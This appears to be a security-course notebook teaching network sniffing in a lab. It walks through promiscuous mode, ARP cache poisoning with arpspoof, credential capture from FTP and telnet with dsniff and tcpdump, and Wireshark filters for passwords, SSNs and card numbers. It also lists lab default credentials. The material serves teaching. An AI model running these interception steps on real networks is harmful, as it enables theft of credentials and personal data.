# Network Sniffing
- sniffing packets in unswitched network is fairly easy as packets are usually broadcasted to all the hosts in the network
- hub is a network device that broadcasts all the packets e.g. and simply running the interface card in promiscuous mode would collect all the data that was broadcasted
- sniffing packets in switched network is a bit challange
- if systems are behind router or network switch they're using swtiched network
    - packets are redirected to destination based on their MAC address

# Active sniffing
- in a switched network environment, packets are only sent to the port they are destined for (using MAC addresses)
- promiscuous devices aren't able to sniff any additional packets that aren't destined for them
- a switch usually has multiple ethernet ports with its own MAC addresses

## arp spoofing

- arp spoofing allows the attacker's to redirect the victims packets to her system
- send a bunch of bogus ARP reply with attackers MAC but victim's IP; saying hey this is my IP and my MAC is this...
- victim then refreshes its ARP cache table (unless its explicitly marked as permanent) or adds new entry
- systems will accept ARP reply even if they don't send out ARP request
- also called ARP cache poisoning
- typically attackers would want to spoof gateway/router/switch that routes all the traffic from a local network out to the Internet

<img src="resources/arp-spoofing.png" />

## Docker MitM Attack Demo

- See `demos/docker/mitm/docker-compose.yml` file for a docker network demo using docker-compose
- Creates 3 hosts/services:
    - attacker - host
    - server - metasploitable2
    - client
- creates a network using subnet: 10.10.0.0/24
    
- change working directoy to `demos/docker`
- run the following commands
- `$ sudo docker-compose build`
- `$ sudo docker-compose up`
- `$ sudo docker-compose down`

    
## Docker Server
    
- run /bin/bash on server container
- see all the open ports
    
- `$ sudo docker exect -it server /bin/bash`
- `root@server:/# sudo netstat -tulpn | grep LISTEN`
- `$ nmap localhost`
- `$ ifconfig`
- ping client


## Docker Client
- run bash command on docker client container
- ping seerver
- telnet server
- `$ telnet 10.10.0.2`
- use account: msfadmin:msfadmin
- install ftp client
- `$ apt update`
- `$ apt install -y ftp`
- ftp to server
- `ftp <server_ip>`; use account: msfadmin:msfadmin
    
    
## Attacker container
- install nmap
- `$ apt update`
- `$ apt install nmap`
- `$ nmap 10.10.0.2`
- install dnsiff package for arpspoof
- `$ apt install -y dsniff`
- Note dsniff is not working on docker, but arpspoof works!

## Steps for Active Sniffing

- listening device/system must run the network card inferface in promiscuous mode to sniff packets
- `sudo ifconfig <interface> promisc` to enable promiscuous mode
- need sudo privileges to run the command

In [ ]:
! echo kali | sudo -S ifconfig

In [ ]:
#ifconfig <interfaceCard> promisc on
! echo kali | sudo -S ifconfig eth0 promisc

In [ ]:
# trun off promisc mode
! echo kali | sudo -S ifconfig eth0 -promisc

In [ ]:
#ifconfig <interfaceCard>
! echo kali | sudo -S ifconfig eth0

## Lab Setup with VM or Docker

## Install vsftpd server or use metaploitable2 linux

- install ftpd server for demo - remember FTP is not encrypted; typically use OpenSSH
- detail instruction: http://itsfoss.com/set-ftp-server-linux

## metaploitable2 linux
- run the VM
- find its IP address
- double check if port 21 ftp server is running

```bash
$ sudo lsof -i:21
```

- login using msfadmin:msfadmin account from another VM

- install ftp client if needed on another VM

In [ ]:
! echo kali | sudo -S apt install vsftpd -y

In [ ]:
# configure FTP Server
! man vsftpd.conf

### Configure and restart FTP Server
- open /etc/vsftpd.conf to change settings
- allow users in /etc/passwd to login
    - `local_enable=YES`
- allow uploading to the FTP server
    - `write_enable=YES`
    
- restrict local users to their home directory
    - `chroot_local_user=YES`
    
- files are served by default from /srv/ftp
- restart FTP server

```bash
sudo service vsftpd restart
```

- add a new user say ftp-user
- don't add the user to sudo group!

```
$ sudo adduser ftp-user
```

In [ ]:
# restart FTP server after modifying the conf settings
! echo kali | sudo -S systemctl restart vsftpd

## install ftp client if needed

- type ftp and if it's missing, install it

In [ ]:
! echo kali | sudo -S apt install -y ftp

In [ ]:
# run update if ftp install fails
! echo kali | sudo -S apt update -y 

In [ ]:
! echo kali | sudo -S apt install -y tcpdump

In [ ]:
! echo kali | sudo -S apt install -y dsniff

## Sniff user accounts in plain text

- ftp, telnet, pop3, etc.
- run ftp server on a VM and try to connect to it from a different VM
```bash
ftp <server ip>
<username>
<password>
```
- sniff it first from wihtin Kali itself
    - Kali is attacker and victim
- use Kali as a client and Msfadmin as a server

In [ ]:
# run tcpdump from a terminal
# tcpdump -l -X 'ip host <ip>'
! echo kali | sudo tcpdump -l -X 'ip host 192.168.1.148'

In [ ]:
# run dsniff from a terminal
! dsniff -n
# displays ftp username:password captured only after clinet disconnects!

## Install and run telnet server
- not secure; use ssh
- https://www.cyberciti.biz/faq/howto-install-enable-telnet-on-debian-linux/
- telnet server is also already installed and configured in metaploitable2
- use msfadmin:msfadmin account to login

In [ ]:
! echo kali | sudo -S apt install telnet telnetd -y

In [ ]:
! echo kali | sudo -S /etc/init.d/xinetd restart  

### Install and configure telnet server on Ubuntu
- follow directions from: http://jdav.is/2018/04/22/installing-and-enabling-telnet-server-on-ubuntu-linux/
- if you edit /etc/xinetd.d/telnet config file, updated the following line:

`
server = /usr/sbin/telnetd
`

## steps
    - we'll do a simple MitM between two victims for ethical reasons given we have permission from the victims

1. add the MAC addresses of the victims on the attackers machine

In [ ]:
# find victims in the network; find the network address
! echo kali | sudo -S ifconfig

In [ ]:
# run nmap ping scan (disable port scan) to find hosts in the network
! nmap -sn 192.168.195.0/24

- See victims ARP cache
```bash
arp -n
arp -d <ip address> # delete entry; you;ll see incomplete entry
```

In [ ]:
# ping a victim ip
! ping -c 1 -w 1 <victim1 IP>

In [ ]:
# ping another victim ip
! ping -c 1 -w 1 <victim2 IP>

In [ ]:
# check the atackers arp cache
! arp -n

2. enable ip forwarding capability in the kernel so the victims do get their packets and are not suspicious of any spoofing activities

In [ ]:
# check ip_forward settings - 0 means disabled
! echo kali | sudo -S cat /proc/sys/net/ipv4/ip_forward

In [ ]:
! echo kali | sudo -S sysctl net.ipv4.ip_forward

In [ ]:
# enable if necessary on the fly
! echo kali | sudo -S sysctl -w net.ipv4.ip_forward=1

### enable ip forwarding permanently
- open /etc/sysctl.conf file in an editor add the following line
```
net.ipv4.ip_forward = 1
```
- run the following command to enable the changes made

```
$ sysctl -p /etc/sysctl.conf
```

- or on Ubuntu run the following command

```
$ /etc/init.d/procps.sh restart
```

3. run arpspoof program to sniff packets on a switched LAN

- install if needed

In [ ]:
! man arpspoof

#### run arpspoof
- must run as super user/root

```
$ sudo arpspoof -i <interface> -t <targetIP or victim1IP> -r <hostIP or victim2IP>

```
- let the arpspoof continue to run
- run dsniff on another terminal to sniff username and password
- make a victim connect to FTP server running on another victim
```bash
ftp <victimIP Running FTP server>
<username>
<password>
```
- close the connection and you'll see the username and password on dsniff terminal

## Wireshark

- use wireshark to caputure the sniffed traffic

- https://www.wireshark.org/docs/wsug_html_chunked/ChapterIntroduction.html
- https://www.wireshark.org/docs/wsug_html_chunked/ChWorkBuildDisplayFilterSection.html
- some filters - see manage saved bookmarks for exampes (Ribbon on the left side of filter bar)
- add/remove filters for quick reference: Analyze -> Display Filters 

## Use FTP server to generate interest data
- account info 
- common FTP commands
```bash
ftp <ip of FTP server>
<username>
<password>
ls
cd <folderName>
put filename.txt # upload a file
get filename.txt # download a file
```

## Some common filters

```
ip.src == 192.168.1. and ip.dst == 192.168.1.122
ip.src == <clientIP> and ip.dst == <ftp server IP> and tcp.port == 21
```
    
### check data contents on TCP traffic with keyword
```  
tcp contains PASS 
tcp contains secret
frame contains <word>
```

### Use Regular Expression

- match SSN format
```
tcp matches "[0-9]{3}\-[0-9]{2}\-[0-9]{4}"
```
    
- match 16 digit credit card numbers with spaces in between
```
tcp matches "[0-9]{4} [0-9]{4} [0-9]{4} [0-9]{4}"
```